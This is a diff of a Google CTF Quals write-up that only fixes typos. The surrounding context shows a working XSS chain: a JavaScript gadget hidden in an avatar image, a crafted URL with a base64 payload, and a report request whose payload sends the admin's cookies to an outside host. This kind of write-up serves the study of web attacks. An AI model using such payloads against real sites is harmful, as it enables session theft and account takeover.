@@ -180,7 +180,7 @@ Of course I did not know this that time, but...
 
 So it was only 30 minutes left from the Google CTF Quals and it was clear I won't be able to generate a correct PNG, but as a last time effort I looked into the code again...
 
-Also I know from the latest 3.5 hours of trying that I can inject smaller payload as that won't be changed, but the smallest base64 payload was not small enough. Maybe a raw JS payload?
+Also I knew from the latest 3.5 hours of trying that I can inject smaller payload as that won't be changed, but the smallest base64 payload was not small enough. Maybe a raw JS payload?
 
 {% highlight javascript %}
 $(atob(location.hash.slice(1)))
@@ -198,7 +198,7 @@ This image:
 
 (you can find the `$(atob(location.hash.slice(1)))` between offsets 12326 - 12356)
 
-And this URL finally made it possible to execute my XSS:
+and this URL finally made it possible to execute my XSS:
 
 {% highlight text %}
 https://bbs.web.ctfcompetition.com/post?p[url]=/avatar/0939691cf1a771225f6ba39bb9934686&p[headers][Range]=bytes=12326-12356&p[dataType]=script#PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpIC8+
@@ -210,7 +210,7 @@ The final step was just to send this URL to the admin:
 $.post('/report', { 'post': '/admin/1/../../post?p[url]=/avatar/0939691cf1a771225f6ba39bb9934686&p[headers][Range]=bytes=12326-12356&p[dataType]=script#PGltZyBzcmM9eCBvbmVycm9yPSJsb2NhdGlvbj0nLy9jdWJ5LmRhdGFnbG9iZS5ldS94L0ZMQUcnK2RvY3VtZW50LmNvb2tpZSIgLz4=' })
 {% endhighlight %}
 
-Which finally gave my the flag:
+Which finally gave me the flag:
 
 {% highlight text %}
 CTF{yOu_HaVe_Been_b&}
